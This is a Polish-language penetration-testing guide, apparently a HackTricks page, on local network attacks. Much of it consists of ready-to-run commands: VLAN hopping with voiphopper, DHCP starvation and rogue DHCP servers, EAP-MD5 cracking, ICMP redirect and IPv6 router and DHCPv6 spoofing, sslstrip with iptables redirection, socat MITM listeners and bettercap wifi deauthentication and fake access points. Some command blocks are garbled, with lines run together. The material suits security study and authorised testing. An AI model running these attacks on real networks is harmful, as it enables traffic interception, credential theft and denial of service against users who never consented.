Narzędzie [**voiphopper**](http://voiphopper.sourceforge.net) jest przeznaczone do emulowania telefonu VoIP w różnych środowiskach (Cisco, Avaya, Nortel, Alcatel-Lucent). Odkrywa identyfikator VLAN sieci głosowej za pomocą protokołów takich jak CDP, DHCP, LLDP-MED i 802.1Q ARP.

**VoIP Hopper** oferuje trzy tryby dla protokołu Cisco Discovery Protocol (CDP):

1. **Tryb podsłuchu** (`-c 0`): Analizuje pakiety sieciowe w celu zidentyfikowania identyfikatora VLAN.
2. **Tryb podszywania się** (`-c 1`): Generuje niestandardowe pakiety imitujące te z rzeczywistego urządzenia VoIP.
3. **Tryb podszywania się z wcześniej przygotowanym pakietem** (`-c 2`): Wysyła pakiety identyczne z tymi z określonego modelu telefonu IP Cisco.

Preferowany tryb dla szybkości to trzeci. Wymaga określenia:

- Interfejsu sieciowego atakującego (`-i` parametr).
- Nazwy emulowanego urządzenia VoIP (`-E` parametr), zgodnej z formatem nazewnictwa Cisco (np. SEP, a następnie adres MAC).

W środowiskach korporacyjnych, aby naśladować istniejące urządzenie VoIP, można:

- Sprawdzić etykietę MAC na telefonie.
- Przejść do ustawień wyświetlacza telefonu, aby wyświetlić informacje o modelu.
- Podłączyć urządzenie VoIP do laptopa i obserwować żądania CDP za pomocą Wiresharka.

Przykładowe polecenie do uruchomienia narzędzia w trzecim trybie wyglądałoby tak:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
#### Wyliczanie

Wyliczanie to proces identyfikowania i zbierania informacji o sieci, które mogą być przydatne podczas ataków DHCP. Poniżej przedstawiono kilka technik wyliczania:

- **DHCP Starvation**: Atakujący wysyła duże ilości żądań DHCP do serwera, aby wyczerpać pulę dostępnych adresów IP. W rezultacie, serwer DHCP przestaje przydzielać nowe adresy IP, co prowadzi do braku dostępności dla nowych klientów.
- **DHCP Snooping**: Atakujący podsłuchuje ruch DHCP w celu uzyskania informacji o klientach i serwerach DHCP w sieci. Może to obejmować zbieranie adresów IP, nazw hostów, adresów MAC i innych danych.
- **DHCP Rogue Server**: Atakujący uruchamia fałszywy serwer DHCP w sieci, który może przydzielać nieprawidłowe adresy IP lub wykonywać inne złośliwe działania.
- **DHCP Client Spoofing**: Atakujący podszywa się pod prawidłowego klienta DHCP, aby uzyskać dostęp do adresu IP przydzielonego temu klientowi.

Wyliczanie może dostarczyć atakującemu cennych informacji, które mogą być wykorzystane do dalszych ataków na sieć.
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Istnieją dwa rodzaje ataków typu DoS, które można przeprowadzić na serwerach DHCP. Pierwszy polega na **symulowaniu wystarczającej liczby fałszywych hostów, aby wykorzystać wszystkie możliwe adresy IP**.\
Ten atak będzie działał tylko wtedy, gdy można zobaczyć odpowiedzi serwera DHCP i ukończyć protokół (**Discover** (Comp) --> **Offer** (serwer) --> **Request** (Comp) --> **ACK** (serwer)). Na przykład, jest to **niemożliwe w sieciach Wi-Fi**.

Innym sposobem na przeprowadzenie ataku DoS na DHCP jest wysłanie **pakietu DHCP-RELEASE, używając jako źródła każdego możliwego adresu IP**. Wtedy serwer będzie myślał, że wszyscy zakończyli korzystanie z tego adresu IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bardziej automatycznym sposobem na to jest użycie narzędzia [DHCPing](https://github.com/kamorin/DHCPig).

Możesz użyć wspomnianych ataków DoS, aby zmusić klientów do uzyskania nowych dzierżaw w środowisku i wyczerpać prawidłowe serwery, aby stały się nieodpowiednie. W ten sposób, gdy prawidłowe serwery spróbują ponownie połączyć się, **możesz serwować złośliwe wartości, o których mowa w następnym ataku**.

#### Ustawianie złośliwych wartości

Rogue serwer DHCP można skonfigurować przy użyciu skryptu DHCP znajdującego się w lokalizacji `/usr/share/responder/DHCP.py`. Jest to przydatne w atakach sieciowych, takich jak przechwytywanie ruchu HTTP i poświadczeń, poprzez przekierowanie ruchu do złośliwego serwera. Jednak ustawienie rogue bramy jest mniej skuteczne, ponieważ pozwala tylko na przechwytywanie ruchu wychodzącego z klienta, pomijając odpowiedzi od prawdziwej bramy. Zamiast tego, zaleca się ustawienie rogue serwera DNS lub WPAD dla bardziej skutecznego ataku.

Poniżej przedstawiono opcje poleceń do konfiguracji rogue serwera DHCP:

- **Nasz adres IP (Reklama bramy)**: Użyj `-i 10.0.0.100`, aby reklamować IP twojego komputera jako bramy.
- **Lokalna nazwa domeny DNS**: Opcjonalnie, użyj `-d example.org`, aby ustawić lokalną nazwę domeny DNS.
- **Pierwotny adres IP routera/bramy**: Użyj `-r 10.0.0.1`, aby określić adres IP prawidłowego routera lub bramy.
- **Adres IP głównego serwera DNS**: Użyj `-p 10.0.0.100`, aby ustawić adres IP rogue serwera DNS, który kontrolujesz.
- **Adres IP drugorzędnego serwera DNS**: Opcjonalnie, użyj `-s 10.0.0.1`, aby ustawić adres IP drugorzędnego serwera DNS.
- **Maska podsieci lokalnej**: Użyj `-n 255.255.255.0`, aby zdefiniować maskę podsieci dla sieci lokalnej.
- **Interfejs dla ruchu DHCP**: Użyj `-I eth1`, aby nasłuchiwać ruchu DHCP na określonym interfejsie sieciowym.
- **Adres konfiguracji WPAD**: Użyj `-w “http://10.0.0.100/wpad.dat”`, aby ustawić adres konfiguracji WPAD, pomagający w przechwytywaniu ruchu sieciowego.
- **Podszywanie się pod domyślną bramę IP**: Dodaj `-S`, aby podszyć się pod adres IP domyślnej bramy.
- **Odpowiedź na wszystkie żądania DHCP**: Dodaj `-R`, aby serwer odpowiadał na wszystkie żądania DHCP, ale miej świadomość, że jest to głośne i może być wykryte.

Poprawne użycie tych opcji umożliwia skonfigurowanie rogue serwera DHCP w celu skutecznego przechwytywania ruchu sieciowego.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Ataki EAP**

Oto niektóre taktyki ataków, które mogą być stosowane wobec implementacji 802.1X:

* Aktywne łamanie hasła metodą brute-force za pomocą EAP
* Atakowanie serwera RADIUS za pomocą zniekształconej zawartości EAP _(eksploity)_
* Przechwytywanie wiadomości EAP i łamanie hasła offline (EAP-MD5 i PEAP)
* Wymuszanie uwierzytelniania EAP-MD5 w celu obejścia weryfikacji certyfikatu TLS
* Wstrzykiwanie złośliwego ruchu sieciowego po uwierzytelnieniu za pomocą huba lub podobnego urządzenia

Jeśli atakujący znajduje się między ofiarą a serwerem uwierzytelniania, może on spróbować zdegradować (jeśli to konieczne) protokół uwierzytelniania do EAP-MD5 i przechwycić próbę uwierzytelnienia. Następnie może on przeprowadzić atak brute-force, używając:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Ataki FHRP (GLBP i HSRP) <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol) to klasa protokołów sieciowych zaprojektowanych do **tworzenia gorącego redundantnego systemu routingu**. Dzięki FHRP fizyczne routery mogą być połączone w jedno logiczne urządzenie, co zwiększa odporność na awarie i pomaga w rozłożeniu obciążenia.

**Inżynierowie Cisco Systems opracowali dwa protokoły FHRP, GLBP i HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Istnieją trzy wersje protokołu Routing Information Protocol (RIP): RIP, RIPv2 i RIPng. Datagramy są wysyłane do partnerów za pomocą portu 520 przy użyciu protokołu UDP przez RIP i RIPv2, podczas gdy datagramy są rozgłaszane do portu UDP 521 za pomocą multicastu IPv6 przez RIPng. Wersja RIPv2 wprowadziła obsługę uwierzytelniania MD5. Natomiast w przypadku RIPng nie jest stosowane natywne uwierzytelnianie; zamiast tego polega się na opcjonalnych nagłówkach IPsec AH i ESP w IPv6.

- **RIP i RIPv2:** Komunikacja odbywa się za pomocą datagramów UDP na porcie 520.
- **RIPng:** Wykorzystuje port UDP 521 do rozgłaszania datagramów za pomocą multicastu IPv6.

Należy zauważyć, że RIPv2 obsługuje uwierzytelnianie MD5, podczas gdy RIPng nie zawiera natywnego uwierzytelniania, polegając na nagłówkach IPsec AH i ESP w IPv6.


### Ataki na EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** to dynamiczny protokół routingu. **Jest to protokół wektorów odległości**. Jeśli nie ma **uwierzytelniania** i konfiguracji interfejsów pasywnych, **intruz** może ingerować w routowanie EIGRP i powodować **zatrucie tablic routingu**. Ponadto, sieć EIGRP (innymi słowy, autonomiczny system) **jest płaska i nie ma podziału na strefy**. Jeśli **atakujący wstrzykuje trasę**, prawdopodobne jest, że ta trasa **rozprzestrzeni się** w całym autonomicznym systemie EIGRP.

Aby zaatakować system EIGRP, konieczne jest **ustanowienie sąsiedztwa z prawidłowym routerem EIGRP**, co otwiera wiele możliwości, od podstawowej rozpoznania po różne wstrzyknięcia.

[**FRRouting**](https://frrouting.org/) pozwala na implementację **wirtualnego routera obsługującego protokoły BGP, OSPF, EIGRP, RIP i inne.** Wystarczy go zainstalować na systemie atakującego, aby faktycznie udawać prawidłowego routera w domenie routingu.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) posiada możliwości przechwytywania transmisji rozgłaszanych przez EIGRP (Enhanced Interior Gateway Routing Protocol). Umożliwia również wstrzykiwanie pakietów, które można wykorzystać do zmiany konfiguracji routingu.

### OSPF

W protokole Open Shortest Path First (OSPF) **często stosuje się uwierzytelnianie MD5 w celu zapewnienia bezpiecznej komunikacji między routerami**. Jednak ta środek bezpieczeństwa może zostać naruszony za pomocą narzędzi takich jak Loki i John the Ripper. Narzędzia te są zdolne do przechwytywania i łamania skrótów MD5, ujawniając klucz uwierzytelniania. Po uzyskaniu tego klucza można go użyć do wprowadzenia nowych informacji o trasowaniu. Aby skonfigurować parametry trasy i ustawić skompromitowany klucz, wykorzystuje się zakładki _Injection_ i _Connection_.

- **Przechwytywanie i łamanie skrótów MD5:** Narzędzia takie jak Loki i John the Ripper są używane w tym celu.
- **Konfigurowanie parametrów trasy:** Odbywa się to za pomocą zakładki _Injection_.
- **Ustawianie skompromitowanego klucza:** Klucz jest konfigurowany w zakładce _Connection_.

### Inne ogólne narzędzia i źródła

* [**Above**](https://github.com/c4s73r/Above): Narzędzie do skanowania ruchu sieciowego i wyszukiwania podatności
* Możesz znaleźć **więcej informacji na temat ataków sieciowych [tutaj](https://github.com/Sab0tag3d/MITM-cheatsheet)**.

## **Podszywanie się**

Atakujący konfiguruje wszystkie parametry sieciowe (GW, IP, DNS) nowego członka sieci, wysyłając fałszywe odpowiedzi DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Sprawdź [poprzednią sekcję](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect polega na wysłaniu pakietu ICMP typu 1, kodu 5, który wskazuje, że atakujący jest najlepszym sposobem na dotarcie do danego adresu IP. Następnie, gdy ofiara chce skontaktować się z tym adresem IP, pakiet zostanie wysłany przez atakującego.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Atakujący rozwiąże niektóre (lub wszystkie) domeny, o które prosi ofiara.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Konfiguracja własnego DNS-a za pomocą dnsmasq**

Dnsmasq to narzędzie, które umożliwia konfigurację własnego serwera DNS na twoim systemie. Możesz go użyć do przekierowywania ruchu sieciowego na konkretne adresy IP lub do blokowania dostępu do określonych stron internetowych.

Aby skonfigurować własny DNS za pomocą dnsmasq, wykonaj następujące kroki:

1. Zainstaluj dnsmasq na swoim systemie. Możesz to zrobić za pomocą menedżera pakietów swojego systemu operacyjnego.

2. Po zainstalowaniu dnsmasq, otwórz plik konfiguracyjny `/etc/dnsmasq.conf` za pomocą edytora tekstu.

3. W pliku konfiguracyjnym, możesz zdefiniować własne przekierowania DNS. Na przykład, jeśli chcesz przekierować ruch z domeny `example.com` na adres IP `192.168.1.100`, dodaj następującą linię:

   ```
   address=/example.com/192.168.1.100
   ```

   Możesz dodać więcej przekierowań, dodając kolejne linie w tym samym formacie.

4. Jeśli chcesz zablokować dostęp do określonych stron internetowych, możesz użyć funkcji blokowania domen w dnsmasq. Dodaj następującą linię, aby zablokować dostęp do domeny `example.com`:

   ```
   address=/example.com/127.0.0.1
   ```

   Podobnie jak wcześniej, możesz dodać więcej blokad, dodając kolejne linie.

5. Po wprowadzeniu odpowiednich zmian w pliku konfiguracyjnym, zapisz go i uruchom ponownie usługę dnsmasq, aby zastosować nową konfigurację.

Teraz, gdy twój własny serwer DNS jest skonfigurowany za pomocą dnsmasq, możesz korzystać z niego, ustawiając odpowiednie ustawienia DNS na swoim systemie lub urządzeniu.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokalne Bramy

Często istnieje wiele tras do systemów i sieci. Po utworzeniu listy adresów MAC w lokalnej sieci, użyj _gateway-finder.py_, aby zidentyfikować hosty obsługujące przekazywanie IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Podszywanie się pod LLMNR, NBT-NS i mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

W przypadku braku możliwości rozwiązania nazw DNS, systemy Microsoft polegają na **Link-Local Multicast Name Resolution (LLMNR)** oraz **NetBIOS Name Service (NBT-NS)** do lokalnego rozwiązywania nazw hostów. Podobnie, implementacje **Apple Bonjour** i **Linux zero-configuration** wykorzystują **Multicast DNS (mDNS)** do odkrywania systemów w sieci. Ze względu na brak uwierzytelnienia tych protokołów oraz ich działanie poprzez wysyłanie komunikatów broadcastowych przez UDP, mogą być one wykorzystane przez atakujących do przekierowywania użytkowników na złośliwe usługi.

Możesz podszywać się pod usługi poszukiwane przez hosty, używając narzędzia Responder do wysyłania fałszywych odpowiedzi.\
Przeczytaj tutaj więcej informacji na temat [jak podszywać się pod usługi za pomocą Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Podszywanie się pod WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Przeglądarki często korzystają z protokołu **Web Proxy Auto-Discovery (WPAD)**, aby automatycznie pobierać ustawienia proxy. Polega to na pobieraniu szczegółów konfiguracji z serwera, konkretnie za pomocą adresu URL takiego jak "http://wpad.example.org/wpad.dat". Odkrycie tego serwera przez klientów może nastąpić za pomocą różnych mechanizmów:

- Poprzez **DHCP**, gdzie odkrycie jest ułatwione poprzez wykorzystanie specjalnego wpisu o kodzie 252.
- Poprzez **DNS**, co polega na wyszukiwaniu nazwy hosta oznaczonej jako _wpad_ w domenie lokalnej.
- Za pomocą **Microsoft LLMNR i NBT-NS**, które są mechanizmami zapasowymi używanymi w przypadkach, gdy rozwiązanie nazw DNS nie powiedzie się.

Narzędzie Responder wykorzystuje ten protokół, działając jako **złośliwy serwer WPAD**. Wykorzystuje DHCP, DNS, LLMNR i NBT-NS, aby wprowadzić klientów w błąd i skierować ich do niego. Aby zagłębić się w to, jak usługi mogą być podszywane za pomocą Responder, [sprawdź to](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).


### [Podszywanie się pod urządzenia SSDP i UPnP](spoofing-ssdp-and-upnp-devices.md)

Możesz oferować różne usługi w sieci, aby **oszukać użytkownika** i skłonić go do podania **hasła w postaci zwykłego tekstu**. **Więcej informacji na temat tego ataku znajdziesz w** [**Podszywanie się pod urządzenia SSDP i UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### Podszywanie się pod sąsiada IPv6

Ten atak jest bardzo podobny do Podszywania się pod ARP, ale w świecie IPv6. Możesz sprawić, że ofiara uwierzy, że adres IPv6 bramy ma adres MAC atakującego.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### Sfałszowanie/Zalewanie ogłoszeń routera IPv6

Niektóre systemy operacyjne domyślnie konfigurują bramę na podstawie pakietów RA wysyłanych w sieci. Aby zadeklarować atakującego jako router IPv6, można użyć:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### Podstawy podszywania się pod DHCP IPv6

Domyślnie niektóre systemy operacyjne próbują skonfigurować DNS, czytając pakiet DHCPv6 w sieci. W takim przypadku atakujący może wysłać pakiet DHCPv6, aby skonfigurować siebie jako DNS. DHCP również przypisuje ofierze adres IPv6.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fałszywa strona i wstrzyknięcie kodu JS)

## Ataki internetowe

### sslStrip

Podstawowo, co robi ten atak to, w przypadku, gdy **użytkownik** próbuje **uzyskać dostęp** do **strony HTTP**, która **przekierowuje** do wersji **HTTPS**. **sslStrip** utrzymuje **połączenie HTTP z** klientem i **połączenie HTTPS z** serwerem, dzięki czemu może **przechwycić** połączenie w **czystym tekście**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Więcej informacji [tutaj](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ i dns2proxy do omijania HSTS

**Różnica** między **sslStrip+ a dns2proxy** w porównaniu do **sslStrip** polega na tym, że będą **przekierowywać** na przykład _**www.facebook.com**_ **na** _**wwww.facebook.com**_ (zauważ dodatkową literę "**w**") i ustawią **adres tej domeny jako adres IP atakującego**. W ten sposób **klient** będzie **łączył się** z _**wwww.facebook.com**_ **(atakujący)**, ale za kulisami **sslstrip+** będzie **utrzymywał** **rzeczywiste połączenie** za pośrednictwem protokołu HTTPS z **www.facebook.com**.

**Celem** tej techniki jest **uniknięcie HSTS**, ponieważ _**wwww**.facebook.com_ **nie** zostanie zapisane w **pamięci podręcznej** przeglądarki, dzięki czemu przeglądarka zostanie oszukana i przeprowadzi uwierzytelnianie **Facebooka w protokole HTTP**.\
Należy zauważyć, że aby przeprowadzić ten atak, ofiara musi spróbować początkowo uzyskać dostęp do [http://www.faceook.com](http://www.faceook.com), a nie https. Można to zrobić, modyfikując linki na stronie http.

Więcej informacji [tutaj](https://www.bettercap.org/legacy/#hsts-bypass), [tutaj](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) i [tutaj](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip lub sslStrip+ już nie działają. Wynika to z faktu, że w przeglądarkach zapisane są reguły HSTS, więc nawet jeśli użytkownik po raz pierwszy uzyskuje dostęp do "ważnej" domeny, będzie to odbywać się za pośrednictwem protokołu HTTPS. Należy również zauważyć, że zapisane reguły i inne wygenerowane reguły mogą używać flagi** [**`includeSubdomains`**](https://hstspreload.appspot.com) **, więc wcześniejszy przykład z** _**wwww.facebook.com**_ **już nie zadziała, ponieważ** _**facebook.com**_ **korzysta z HSTS z `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## Nasłuchiwanie TCP na porcie
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## Nasłuchiwanie na porcie TCP + SSL

#### Generowanie kluczy i samopodpisanego certyfikatu

```bash
openssl genrsa -out private.key 2048
openssl req -new -x509 -key private.key -out certificate.crt -days 365
```

#### Listen on port 443

```bash
openssl s_server -key private.key -cert certificate.crt -accept 443 -www
```

#### Listen on port 8443

```bash
openssl s_server -key private.key -cert certificate.crt -accept 8443 -www
```
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Słuchaj za pomocą certyfikatu

To listen to network traffic using a certificate, you can perform a Man-in-the-Middle (MitM) attack. This attack involves intercepting the communication between two parties and decrypting the encrypted traffic using a certificate.

Here are the steps to perform this attack:

1. Generate a self-signed certificate or obtain a valid certificate for the target domain.
2. Set up a proxy server to intercept the network traffic.
3. Configure the proxy server to use the certificate for SSL/TLS decryption.
4. Redirect the target's traffic to the proxy server.
5. Intercept the encrypted traffic and decrypt it using the certificate.
6. Analyze the decrypted traffic for any sensitive information.

Keep in mind that performing a MitM attack without proper authorization is illegal and unethical. Always ensure you have the necessary permissions and legal rights before attempting any hacking techniques.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Słuchaj używając certyfikatu i przekieruj do hostów

Aby przeprowadzić atak typu "Man-in-the-Middle" (MITM) na sieć, możemy użyć certyfikatu SSL/TLS, który pozwoli nam podsłuchiwać komunikację między hostami. Poniżej przedstawiono kroki, które należy podjąć, aby osiągnąć ten cel:

1. Wygeneruj własny certyfikat SSL/TLS, który będzie używany do podsłuchiwania. Możesz to zrobić za pomocą narzędzi takich jak OpenSSL.

2. Skonfiguruj serwer proxy, który będzie nasłuchiwał na ruch sieciowy. Możesz użyć narzędzi takich jak Burp Suite lub mitmproxy.

3. Skonfiguruj serwer proxy tak, aby używał wygenerowanego certyfikatu SSL/TLS.

4. Przekieruj ruch sieciowy do serwera proxy. Możesz to zrobić na różne sposoby, na przykład poprzez zmianę ustawień sieciowych na urządzeniach lub poprzez wykorzystanie technik ARP spoofing.

Po wykonaniu tych kroków, serwer proxy będzie nasłuchiwał na ruch sieciowy i przekierowywał go do odpowiednich hostów. Dzięki temu będziemy w stanie podsłuchiwać komunikację między hostami i przechwytywać poufne informacje, takie jak hasła czy dane logowania.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Czasami, jeśli klient sprawdza, czy CA jest prawidłowy, można **udostępnić certyfikat innego hosta podpisanego przez CA**.\
Innym interesującym testem jest udostępnienie **certyfikatu żądanego hosta, ale samopodpisanego**.

Inne rzeczy do przetestowania to próba podpisania certyfikatu ważnym certyfikatem, który nie jest prawidłowym CA. Lub użycie prawidłowego klucza publicznego, wymuszenie użycia algorytmu, takiego jak Diffie-Hellman (który nie wymaga odszyfrowania czegokolwiek za pomocą prawdziwego klucza prywatnego) i gdy klient żąda sondy prawdziwego klucza prywatnego (np. skrótu), wysłanie fałszywej sondy i oczekiwanie, że klient tego nie sprawdzi.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Notatki dotyczące aktywnego odkrywania

Należy pamiętać, że gdy pakiet UDP zostanie wysłany do urządzenia, które nie ma żądanego portu, zostanie wysłany komunikat ICMP (Port Unreachable).

### **Odkrywanie ARP**

Pakiety ARP są używane do odkrywania, które adresy IP są używane w sieci. Komputer musi wysłać żądanie dla każdego możliwego adresu IP, a tylko te, które są używane, odpowiedzą.

### **mDNS (multicast DNS)**

Bettercap wysyła żądanie MDNS (co X ms), pytając o **\_services\_.dns-sd.\_udp.local**. Maszyna, która widzi ten pakiet, zazwyczaj odpowiada na to żądanie. Następnie wyszukuje tylko maszyny odpowiadające na "services".

**Narzędzia**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap wysyła pakiety rozgłoszeniowe na port 137/UDP, pytając o nazwę "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap wysyła rozgłoszeniowe pakiety SSDP, szukając różnego rodzaju usług (port UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap wysyła rozgłoszeniowe pakiety WSD, szukając usług (port UDP 3702).

## Odwołania

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskazówka dotycząca bug bounty**: **zarejestruj się** na platformie **Intigriti**, premium platformie **bug bounty stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
